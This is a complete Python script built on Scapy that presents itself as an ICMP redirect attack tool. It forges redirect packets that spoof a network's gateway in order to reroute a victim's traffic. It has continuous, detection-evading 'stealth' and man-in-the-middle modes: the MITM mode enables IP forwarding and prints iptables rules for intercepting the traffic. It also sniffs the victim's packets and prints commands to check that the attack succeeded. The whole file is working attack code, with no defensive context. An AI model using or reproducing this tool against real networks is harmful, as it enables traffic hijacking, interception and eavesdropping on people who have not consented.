#!/usr/bin/env python3
"""
ICMP Redirect Attack Tool
=========================

Advanced ICMP redirect attack tool with real-time monitoring and verification.
"""

import sys
import os
import argparse
import time
import threading
import subprocess
from faker import Faker
from colorama import init, Fore, Style

try:
    from scapy.all import IP, ICMP, send, sniff, get_if_addr, conf
except ImportError:
    print("Error: Scapy not installed. Please run: pip install scapy")
    sys.exit(1)

init(autoreset=True)

class ICMPRedirectAttacker:
    """Advanced ICMP redirect attack class"""
    
    def __init__(self):
        self.fake = Faker()
        self.attack_stats = {
            'redirects_sent': 0,
            'routing_changes': 0,
            'packets_captured': 0
        }
        self.monitoring = False
        self.initial_routes = {}
    
    def show_banner(self):
        """Display attack banner"""
        print(f"{Fore.RED}{Style.BRIGHT}")
        print("██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗")
        print("██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝")
        print("██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   ")
        print("██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   ")
        print("██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   ")
        print("╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   ")
        print("                  ICMP REDIRECT ATTACK")
        print(f"{Style.RESET_ALL}")
    
    def display_live_stats(self):
        """Display live attack statistics"""
        while self.monitoring:
            print(f"\r{Fore.CYAN}📊 LIVE: {self.attack_stats['redirects_sent']} redirects | {self.attack_stats['routing_changes']} route changes | {self.attack_stats['packets_captured']} packets", end='', flush=True)
            time.sleep(1)
    
    def check_ip_forward(self):
        """Check and enable IP forwarding if needed"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                forward_status = f.read().strip()
                if forward_status != '1':
                    print(f"{Fore.YELLOW}⚠️  IP forwarding disabled, enabling...")
                    subprocess.run(['sysctl', 'net.ipv4.ip_forward=1'], 
                                 check=True, capture_output=True)
                    print(f"{Fore.GREEN}✅ IP forwarding enabled")
                else:
                    print(f"{Fore.GREEN}✅ IP forwarding already enabled")
        except Exception as e:
            print(f"{Fore.RED}❌ Failed to check/enable IP forwarding: {e}")
    
    def capture_initial_route(self, target_ip):
        """Capture initial routing information"""
        try:
            result = subprocess.run(['ip', 'route', 'get', target_ip], 
                                  capture_output=True, text=True, check=True)
            self.initial_routes[target_ip] = result.stdout.strip()
            print(f"{Fore.BLUE}📊 Initial route to {target_ip}:")
            print(f"   {self.initial_routes[target_ip]}")
            return True
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}❌ Failed to get route info for {target_ip}")
            return False
    
    def monitor_routing_changes(self, victim_ip, target_ip, duration=60):
        """Monitor for routing table changes on victim"""
        print(f"{Fore.CYAN}👁️  Monitoring routing changes on {victim_ip} for {target_ip}...")
        
        for i in range(duration):
            try:
                # For remote monitoring, we'd need SSH access or SNMP
                # For now, we'll monitor local changes as an example
                result = subprocess.run(['ip', 'route', 'get', target_ip], 
                                      capture_output=True, text=True, check=True)
                current_route = result.stdout.strip()
                
                if target_ip in self.initial_routes:
                    if current_route != self.initial_routes[target_ip]:
                        print(f"\n{Fore.GREEN}🔄 ROUTING CHANGE DETECTED!")
                        print(f"   Old: {self.initial_routes[target_ip]}")
                        print(f"   New: {current_route}")
                        self.attack_stats['routing_changes'] += 1
                        self.initial_routes[target_ip] = current_route
                
                time.sleep(1)
            except:
                pass
    
    def packet_monitor(self, victim_ip, fake_gateway_ip, duration=60):
        """Monitor for ICMP redirects and redirected traffic"""
        def packet_handler(packet):
            if packet.haslayer(ICMP):
                self.attack_stats['packets_captured'] += 1
                icmp_type = packet[ICMP].type
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                
                if icmp_type == 5:  # ICMP Redirect
                    print(f"\n{Fore.RED}🔀 REDIRECT CAPTURED: {src_ip} → {dst_ip}")
                    if hasattr(packet[ICMP], 'gw'):
                        print(f"   New Gateway: {packet[ICMP].gw}")
                elif src_ip == victim_ip:
                    print(f"\n{Fore.BLUE}📤 VICTIM TRAFFIC: {src_ip} → {dst_ip}")
                elif dst_ip == fake_gateway_ip:
                    print(f"\n{Fore.GREEN}🎯 REDIRECTED TO US: {src_ip} → {dst_ip}")
        
        filter_str = f"icmp or (host {victim_ip}) or (host {fake_gateway_ip})"
        print(f"{Fore.CYAN}🔍 Monitoring network traffic...")
        sniff(filter=filter_str, prn=packet_handler, timeout=duration)
    
    def send_redirect(self, victim_ip, target_ip, gateway_ip, fake_gateway_ip):
        """Send ICMP redirect packet"""
        try:
            # Create the redirect packet
            inner_packet = IP(src=victim_ip, dst=target_ip) / ICMP()
            redirect_packet = (
                IP(src=gateway_ip, dst=victim_ip) /
                ICMP(type=5, code=1, gw=fake_gateway_ip) /
                inner_packet
            )
            
            print(f"{Fore.RED}🚀 Sending ICMP redirect...")
            print(f"   📋 Claiming {fake_gateway_ip} is better route to {target_ip}")
            
            send(redirect_packet, verbose=0)
            self.attack_stats['redirects_sent'] += 1
            
            print(f"{Fore.GREEN}✅ Redirect packet sent!")
            return True
            
        except Exception as e:
            print(f"{Fore.RED}❌ Error sending redirect: {e}")
            return False
    
    def perform_attack(self, victim_ip, target_ip, gateway_ip, fake_gateway_ip=None, 
                      continuous=False, duration=60):
        """Perform complete ICMP redirect attack with monitoring"""
        
        if not fake_gateway_ip:
            fake_gateway_ip = self.fake.ipv4()
        
        self.show_banner()
        print(f"{Fore.YELLOW}🎯 VICTIM: {victim_ip}")
        print(f"{Fore.YELLOW}🎯 TARGET: {target_ip}")
        print(f"{Fore.YELLOW}🚪 GATEWAY: {gateway_ip}")
        print(f"{Fore.YELLOW}🔀 FAKE GATEWAY: {fake_gateway_ip}")
        print(f"{Fore.YELLOW}📊 MODE: {'CONTINUOUS' if continuous else 'SINGLE'}")
        print()
        
        # Setup
        self.check_ip_forward()
        self.capture_initial_route(target_ip)
        
        # Start monitoring
        self.monitoring = True
        stats_thread = threading.Thread(target=self.display_live_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Start packet monitoring
        packet_thread = threading.Thread(
            target=self.packet_monitor, 
            args=(victim_ip, fake_gateway_ip, duration + 30)
        )
        packet_thread.daemon = True
        packet_thread.start()
        
        # Start routing monitor
        route_thread = threading.Thread(
            target=self.monitor_routing_changes,
            args=(victim_ip, target_ip, duration + 30)
        )
        route_thread.daemon = True
        route_thread.start()
        
        try:
            if continuous:
                print(f"{Fore.RED}🔥 CONTINUOUS REDIRECT MODE - Press Ctrl+C to stop")
                redirect_count = 0
                while True:
                    self.send_redirect(victim_ip, target_ip, gateway_ip, fake_gateway_ip)
                    redirect_count += 1
                    
                    if redirect_count % 5 == 0:
                        print(f"\n{Fore.MAGENTA}⚡ Sent {redirect_count} redirects...")
                    
                    time.sleep(10)  # Send redirects every 10 seconds
            else:
                # Send single redirect
                self.send_redirect(victim_ip, target_ip, gateway_ip, fake_gateway_ip)
                
                # Monitor for effects
                print(f"{Fore.CYAN}⏳ Monitoring for {duration} seconds...")
                time.sleep(duration)
        
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⚠️  Attack stopped by user")
        
        finally:
            self.monitoring = False
            time.sleep(2)
            self.show_attack_summary()
            self.show_verification_steps(victim_ip, target_ip, fake_gateway_ip)
    
    def show_attack_summary(self):
        """Display final attack statistics"""
        print(f"\n\n{Fore.CYAN}📊 ATTACK SUMMARY")
        print("=" * 50)
        print(f"🔀 Redirects sent: {self.attack_stats['redirects_sent']}")
        print(f"🔄 Routing changes detected: {self.attack_stats['routing_changes']}")
        print(f"📦 Packets captured: {self.attack_stats['packets_captured']}")
        print("=" * 50)
        
        if self.attack_stats['routing_changes'] > 0:
            print(f"{Fore.GREEN}🎉 SUCCESS: Routing changes detected!")
        else:
            print(f"{Fore.YELLOW}⚠️  No routing changes detected")
    
    def show_verification_steps(self, victim_ip, target_ip, fake_gateway_ip):
        """Show verification commands"""
        print(f"\n{Fore.YELLOW}🔍 VERIFICATION COMMANDS")
        print("=" * 50)
        print(f"{Fore.CYAN}On victim machine ({victim_ip}):")
        print(f"  ip route show | grep {target_ip}")
        print(f"  traceroute {target_ip}")
        print(f"  ping -c 3 {target_ip}")
        print()
        print(f"{Fore.CYAN}On attacker machine:")
        print(f"  sudo tcpdump -i any host {victim_ip}")
        print(f"  sudo tcpdump -i any host {fake_gateway_ip}")
        print(f"  netstat -rn | grep {target_ip}")
        print("=" * 50)
    
    def stealth_redirect(self, victim_ip, target_ip, gateway_ip, fake_gateway_ip=None):
        """Perform stealth redirect with random timing"""
        if not fake_gateway_ip:
            fake_gateway_ip = self.fake.ipv4()
        
        print(f"{Fore.BLUE}🥷 STEALTH REDIRECT ATTACK")
        print(f"🎯 Target: {victim_ip} → {target_ip}")
        print(f"🔀 Fake Gateway: {fake_gateway_ip}")
        print("🕐 Using stealth timing")
        print()
        
        # Random delays to avoid detection
        delays = [5, 8, 12, 15, 20]
        
        for i, delay in enumerate(delays):
            print(f"📤 Sending redirect {i+1}/5 (next in {delay}s)")
            self.send_redirect(victim_ip, target_ip, gateway_ip, fake_gateway_ip)
            
            if i < len(delays) - 1:
                time.sleep(delay)
        
        print(f"{Fore.GREEN}✅ Stealth attack completed")
    
    def mitm_setup(self, victim_ip, target_ip, gateway_ip):
        """Set up man-in-the-middle after successful redirect"""
        fake_gateway_ip = self.get_local_ip()
        
        print(f"{Fore.MAGENTA}🎭 SETTING UP MAN-IN-THE-MIDDLE")
        print(f"🔀 Using our IP as fake gateway: {fake_gateway_ip}")
        print()
        
        # Perform redirect
        self.send_redirect(victim_ip, target_ip, gateway_ip, fake_gateway_ip)
        
        # Set up traffic forwarding
        print(f"{Fore.CYAN}📡 Setting up traffic forwarding...")
        try:
            # Enable IP forwarding
            subprocess.run(['sysctl', 'net.ipv4.ip_forward=1'], check=True, capture_output=True)
            
            # Set up iptables rules for MITM (example)
            print(f"⚙️  Configure iptables for traffic interception:")
            print(f"   iptables -t nat -A PREROUTING -s {victim_ip} -d {target_ip} -j DNAT --to-destination {fake_gateway_ip}")
            print(f"   iptables -t nat -A POSTROUTING -s {victim_ip} -j MASQUERADE")
            
        except Exception as e:
            print(f"{Fore.RED}❌ Error setting up MITM: {e}")
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Advanced ICMP Redirect Attack Tool")
    
    parser.add_argument('victim', help='Victim IP address')
    parser.add_argument('target', help='Target destination IP')
    parser.add_argument('gateway', help='Legitimate gateway IP')
    parser.add_argument('--fake-gateway', '-f', help='Fake gateway IP')
    parser.add_argument('--duration', '-d', type=int, default=60, help='Monitoring duration')
    parser.add_argument('--continuous', action='store_true', help='Continuous attack mode')
    parser.add_argument('--stealth', action='store_true', help='Stealth attack mode')
    parser.add_argument('--mitm', action='store_true', help='Set up man-in-the-middle')
    parser.add_argument('--monitor-only', action='store_true', help='Monitor mode only')
    
    args = parser.parse_args()
    
    # Check root privileges
    if os.geteuid() != 0:
        print(f"{Fore.RED}❌ Root privileges required")
        print(f"{Fore.YELLOW}💡 Run with: sudo python3 {sys.argv[0]} {' '.join(sys.argv[1:])}")
        sys.exit(1)
    
    attacker = ICMPRedirectAttacker()
    
    if args.monitor_only:
        attacker.show_banner()
        print(f"{Fore.CYAN}📡 MONITORING MODE")
        monitor_thread = threading.Thread(
            target=attacker.packet_monitor,
            args=(args.victim, args.fake_gateway or "0.0.0.0", args.duration)
        )
        monitor_thread.start()
        monitor_thread.join()
    elif args.stealth:
        attacker.stealth_redirect(args.victim, args.target, args.gateway, args.fake_gateway)
    elif args.mitm:
        attacker.mitm_setup(args.victim, args.target, args.gateway)
    else:
        attacker.perform_attack(
            victim_ip=args.victim,
            target_ip=args.target,
            gateway_ip=args.gateway,
            fake_gateway_ip=args.fake_gateway,
            continuous=args.continuous,
            duration=args.duration
        )

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⚠️  Terminated by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}❌ Error: {e}")
        sys.exit(1) 